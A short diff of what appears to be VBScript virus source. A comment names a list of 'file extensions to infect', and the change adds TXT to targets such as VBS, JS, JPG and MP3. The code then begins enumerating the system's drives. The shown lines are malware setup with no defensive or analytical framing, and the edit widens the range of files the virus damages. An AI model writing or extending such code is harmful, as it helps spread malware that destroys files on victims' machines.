@@ -1,7 +1,7 @@
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Define the list of file extensions to infect
-extensions = Array("VBS", "VBE", "JS", "JSE", "CSS", "WSH", "SCT", "HTA", "JPG", "JPEG", "MP3", "MP2")
+extensions = Array("VBS", "VBE", "JS", "JSE", "CSS", "WSH", "SCT", "HTA", "JPG", "JPEG", "MP3", "MP2", "TXT")
 
 ' Get the list of drives on the system
 Set drives = objFSO.Drives
